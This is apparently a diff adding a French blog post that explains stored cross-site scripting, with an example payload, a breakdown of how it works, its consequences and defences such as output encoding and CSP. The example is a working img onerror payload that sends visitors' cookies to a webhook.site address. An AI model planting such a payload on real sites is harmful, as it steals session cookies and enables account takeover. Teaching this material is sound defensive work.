@@ -1,0 +1,62 @@
+---
+title: "Comprendre l'attaque XSS stockée"
+description: "Explication détaillée du Cross-Site Scripting stocké, son fonctionnement et ses risques."
+date: 2025-09-22
+tags: ["XSS", "Web", "Sécurité"]
+authors: ["Lux_"]
+image: "https://media.licdn.com/dms/image/v2/D4D12AQH9YPiouVt2-w/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1737045223971?e=2147483647&v=beta&t=njLg1y15NvNrMq4F06_5Ckfwy6chXD5DRuyFEQBjUCI"
+---
+
+# Comprendre l'attaque XSS stockée
+
+Une faille **XSS (Cross-Site Scripting) stockée** est une vulnérabilité qui permet à un attaquant d'injecter un script malveillant directement dans une **base de données** ou un élément persistant d'un site web, comme un **commentaire, un champ de formulaire** ou un profil utilisateur.
+
+Contrairement au XSS réfléchi, qui s'exécute uniquement lorsqu'un utilisateur clique sur un lien spécialement construit, le XSS stocké est **persistant** et affecte **tous les visiteurs** de la page vulnérable.
+
+---
+
+## Exemple d'exploit
+
+Voici un exemple de code qui pourrait être injecté dans un champ vulnérable :
+
+```js
+&lt;img src="x" onerror="new Image().src='https://webhook.site/9aba896b-d7fd-4f87-b5cd-d2d4d2bc7ec4/cookie?data='+document.cookie"&gt;
+```
+
+
+---
+
+## Comment ça fonctionne ?
+
+Ce script fonctionne ainsi :
+
+1. Une image est insérée avec une **source invalide** (`src="x"`).
+2. L'événement **`onerror`** se déclenche lorsque l'image ne peut pas se charger.
+3. Un **nouvel objet Image** est créé, et sa source est définie sur une URL contrôlée par l'attaquant, contenant les **cookies de la victime**.
+4. La requête envoie automatiquement les cookies ou autres informations sensibles vers le serveur de l'attaquant.
+
+---
+
+## Conséquences
+
+Une attaque XSS stockée est particulièrement dangereuse :
+
+- Elle affecte **tous les utilisateurs** visitant la page vulnérable.
+- Les **cookies volés** peuvent contenir des informations sensibles, comme les sessions authentifiées.
+- Elle peut être utilisée pour injecter d'autres types d'exploits :
+- **Redirections malveillantes**
+- **Phishing** intégré dans le site
+- **Modification du contenu affiché** aux utilisateurs
+
+---
+
+## Comment se protéger ?
+
+Pour prévenir les XSS stockés :
+
+- **Échapper / encoder toutes les entrées utilisateurs** avant affichage.
+- Utiliser des **frameworks qui gèrent automatiquement l'encodage** (React, Vue, Astro…).
+- **Valider et filtrer** les données côté serveur.
+- Activer des en-têtes de sécurité HTTP, comme **Content-Security-Policy (CSP)**.
+
+> Le XSS stocké reste l'une des vulnérabilités web les plus critiques, car elle touche directement la confiance entre un site et ses utilisateurs.
